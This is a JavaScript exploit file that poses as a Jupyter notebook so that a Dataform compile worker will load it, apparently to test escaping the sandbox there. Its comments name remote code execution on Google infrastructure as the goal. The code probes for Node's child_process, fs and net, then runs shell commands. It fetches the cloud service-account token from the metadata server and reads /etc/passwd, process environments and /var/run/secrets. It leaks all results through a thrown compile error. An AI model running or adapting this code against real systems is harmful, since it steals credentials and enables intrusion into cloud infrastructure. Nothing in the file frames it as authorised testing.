// HOST REALM ENUMERATION — loaded via notebook filename → nativeRequire()
// Goal: identify if Node.js native primitives (process, child_process, fs, net)
// are reachable from the bundle realm. If yes → RCE on Google compile worker.

var info = {};
function safe(k, fn) {
  try {
    var v = fn();
    info[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 800);
  } catch(e) {
    info[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 300);
  }
}

// ============ TIER 1: Direct host globals ============
safe('typeof_process', function() { return typeof process; });
safe('typeof_Buffer', function() { return typeof Buffer; });
safe('typeof_global', function() { return typeof global; });
safe('typeof_globalThis', function() { return typeof globalThis; });
safe('typeof_require', function() { return typeof require; });
safe('typeof_module', function() { return typeof module; });
safe('typeof___dirname', function() { return typeof __dirname; });
safe('typeof___filename', function() { return typeof __filename; });

// ============ TIER 2: Process info if exposed ============
safe('process_pid', function() { return process.pid; });
safe('process_cwd', function() { return process.cwd(); });
safe('process_argv', function() { return process.argv.join('|'); });
safe('process_execPath', function() { return process.execPath; });
safe('process_versions', function() { return JSON.stringify(process.versions); });
safe('process_platform', function() { return process.platform; });
safe('process_arch', function() { return process.arch; });
safe('process_env_keys_count', function() { return Object.keys(process.env).length; });
safe('process_env_keys', function() { return Object.keys(process.env).slice(0, 80).join(','); });
safe('process_env_K_SERVICE', function() { return process.env.K_SERVICE || 'undefined'; });
safe('process_env_GOOGLE_APPLICATION_CREDENTIALS', function() { return process.env.GOOGLE_APPLICATION_CREDENTIALS || 'undefined'; });
safe('process_env_GCE_METADATA_HOST', function() { return process.env.GCE_METADATA_HOST || 'undefined'; });
safe('process_env_NODE_PATH', function() { return process.env.NODE_PATH || 'undefined'; });
safe('process_env_HOSTNAME', function() { return process.env.HOSTNAME || 'undefined'; });
safe('process_env_HOME', function() { return process.env.HOME || 'undefined'; });
safe('process_env_PATH', function() { return process.env.PATH || 'undefined'; });

// ============ TIER 3: Native require — THE PRIZE ============
safe('req_child_process', function() {
  var cp = require('child_process');
  return 'GOT:execSync=' + typeof cp.execSync + ' spawn=' + typeof cp.spawn;
});
safe('req_fs_native', function() {
  var fs = require('fs');
  return 'GOT:readFileSync=' + typeof fs.readFileSync + ' readdirSync=' + typeof fs.readdirSync;
});
safe('req_net', function() {
  var n = require('net');
  return 'GOT:createConnection=' + typeof n.createConnection;
});
safe('req_http', function() {
  var h = require('http');
  return 'GOT:request=' + typeof h.request;
});
safe('req_https', function() {
  var h = require('https');
  return 'GOT:request=' + typeof h.request;
});
safe('req_os', function() {
  var os = require('os');
  return JSON.stringify({hostname: os.hostname(), platform: os.platform(), userInfo: os.userInfo(), networkInterfaces: Object.keys(os.networkInterfaces())});
});
safe('req_dns', function() { return 'GOT:' + typeof require('dns').lookup; });
safe('req_vm_native', function() { return 'GOT:' + typeof require('vm').runInNewContext; });
safe('req_worker_threads', function() { return 'GOT:' + typeof require('worker_threads').Worker; });
safe('req_url', function() { return 'GOT:' + typeof require('url').URL; });
safe('req_querystring', function() { return 'GOT:' + typeof require('querystring').parse; });
safe('req_path_native', function() { return 'GOT:' + typeof require('path').join; });
safe('req_crypto', function() { return 'GOT:' + typeof require('crypto').randomBytes; });
safe('req_stream', function() { return 'GOT:' + typeof require('stream').Readable; });
safe('req_zlib', function() { return 'GOT:' + typeof require('zlib').gzipSync; });

// ============ TIER 4: If child_process works → RCE proof ============
safe('exec_id', function() { return require('child_process').execSync('id').toString().substring(0, 300); });
safe('exec_hostname', function() { return require('child_process').execSync('hostname').toString().substring(0, 100); });
safe('exec_uname', function() { return require('child_process').execSync('uname -a').toString().substring(0, 300); });
safe('exec_whoami', function() { return require('child_process').execSync('whoami').toString().substring(0, 100); });
safe('exec_pwd', function() { return require('child_process').execSync('pwd').toString().substring(0, 200); });
safe('exec_ls_root', function() { return require('child_process').execSync('ls -la / 2>&1').toString().substring(0, 800); });
safe('exec_env', function() { return require('child_process').execSync('env 2>&1').toString().substring(0, 800); });
safe('exec_proc_self_status', function() { return require('child_process').execSync('cat /proc/self/status 2>&1 | head -20').toString().substring(0, 800); });
safe('exec_metadata_token', function() {
  return require('child_process').execSync(
    'curl -s -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1'
  ).toString().substring(0, 800);
});
safe('exec_metadata_email', function() {
  return require('child_process').execSync(
    'curl -s -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 2>&1'
  ).toString().substring(0, 300);
});
safe('exec_metadata_project', function() {
  return require('child_process').execSync(
    'curl -s -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id 2>&1'
  ).toString().substring(0, 300);
});

// ============ TIER 5: If fs works → read sensitive paths ============
safe('fs_etc_passwd', function() { return require('fs').readFileSync('/etc/passwd', 'utf8').substring(0, 500); });
safe('fs_etc_hostname', function() { return require('fs').readFileSync('/etc/hostname', 'utf8').substring(0, 200); });
safe('fs_proc_self_environ', function() { return require('fs').readFileSync('/proc/self/environ', 'utf8').replace(/\x00/g, '|').substring(0, 800); });
safe('fs_proc_self_cmdline', function() { return require('fs').readFileSync('/proc/self/cmdline', 'utf8').replace(/\x00/g, '|').substring(0, 500); });
safe('fs_proc_self_cgroup', function() { return require('fs').readFileSync('/proc/self/cgroup', 'utf8').substring(0, 500); });
safe('fs_proc_self_mountinfo', function() { return require('fs').readFileSync('/proc/self/mountinfo', 'utf8').substring(0, 800); });
safe('fs_ls_root', function() { return require('fs').readdirSync('/').join(','); });
safe('fs_ls_app', function() { return require('fs').readdirSync('/app').join(','); });
safe('fs_ls_workspace', function() { return require('fs').readdirSync('/workspace').join(','); });
safe('fs_var_run_secrets', function() { return require('fs').readdirSync('/var/run/secrets').join(','); });

// ============ TIER 6: If http works → reach metadata server directly ============
safe('https_metadata_token', function() {
  var https = require('https');
  return 'has_https_module:' + typeof https.request;
});

// ============ TIER 7: globalThis enumeration ============
safe('globalThis_keys', function() {
  return Object.keys(globalThis).sort().join(',').substring(0, 1500);
});
safe('global_keys', function() {
  return Object.keys(global).sort().join(',').substring(0, 1500);
});

// ============ TIER 8: Dataform internals ============
safe('df_session_keys', function() {
  return Object.keys(global._DF_SESSION).join(',');
});
safe('df_session_proto', function() {
  return Object.getOwnPropertyNames(Object.getPrototypeOf(global._DF_SESSION)).join(',');
});
safe('df_session_config', function() {
  return JSON.stringify(global._DF_SESSION.projectConfig).substring(0, 600);
});

// ============ TIER 9: Module cache / known modules ============
safe('module_cache_keys', function() {
  return Object.keys(require.cache || {}).slice(0, 30).join('||').substring(0, 1500);
});
safe('module_paths', function() {
  return (module && module.paths ? module.paths.join(',') : 'no_paths').substring(0, 800);
});

// Provide notebook shape so this file is loadable
module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };

// Surface results via thrown error (captured in compile error message)
throw new Error('HOSTREALM_PROBE_V1:' + JSON.stringify(info));
